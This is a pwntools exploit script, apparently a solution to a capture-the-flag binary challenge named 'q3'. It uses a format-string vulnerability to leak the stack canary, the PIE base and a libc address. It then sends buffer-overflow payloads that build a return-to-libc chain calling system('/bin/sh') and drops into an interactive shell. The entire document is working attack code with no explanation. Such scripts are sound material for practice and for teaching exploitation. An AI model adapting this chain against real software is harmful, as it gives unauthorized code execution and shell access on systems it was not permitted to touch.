from pwn import *
#context_level='DEBUG'

#LIBC - OFFSET: 0xeeff3
#offset 11: canary leak
#0x830: PIE offset

p = process("./q3", env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF("./q3", checksec=False)
libc = elf.libc

def start():
	if not args.REMOTE:
		return process("./q3")
	else:
		return remote("localhost", 22)

p = start()

def main():

	print(p.clean())
	p.sendline("%12$lx-%11$lx")
	p.recvline()

	leak = p.recvline()
	pie = int(leak.strip().split("-")[0], 16) - 0x830
	canary = int(leak.strip().split("-")[1], 16)

	log.info("Canary: " + hex(canary))
	log.info("PIE: " + hex(pie))

	payload = flat(
		"A"*24,
		canary,
		"A"*8,
		pie + elf.sym['main'],
		endianness = 'little', word_size = 64, sign = False
	)

	print(p.clean())
	p.sendline(payload)

	p.sendline("%2$lx")
	p.recvline()

	leak = p.recvline()
	libc.address = int(leak.strip(), 16) - 0x1bd8c0
	log.info("Libc address: " + hex(libc.address))

	payload = flat(
		"A"*24,
		canary,
		"A"*8,
		pie + 0x893, # pop rdi ; ret
		next(libc.search("/bin/sh\x00")),
		libc.sym['system'],
		endianness = 'little', word_size = 64, sign = False
	)

	print(p.clean())
	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
